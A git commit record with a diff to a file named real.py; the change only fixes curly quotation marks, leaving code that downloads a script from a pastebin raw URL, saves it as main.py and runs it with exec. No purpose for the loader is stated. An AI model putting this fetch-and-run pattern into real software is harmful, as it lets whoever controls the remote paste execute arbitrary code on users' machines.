47b5bb50bb96aa4bcb61b017439656de0d938038
lukeworgan-design <lukeworgan@gmail.com>
2026-03-01 14:02:39 +0000

    update

--- real.py
+++ real.py
@@ -1,4 +1,4 @@
 import urllib.request
-url = “https://pastebin.com/raw/XXXXX”
-urllib.request.urlretrieve(url, “main.py”)
-exec(open(“main.py”).read())
+url = "https://pastebin.com/raw/XXXXX"
+urllib.request.urlretrieve(url, "main.py")
+exec(open("main.py").read())
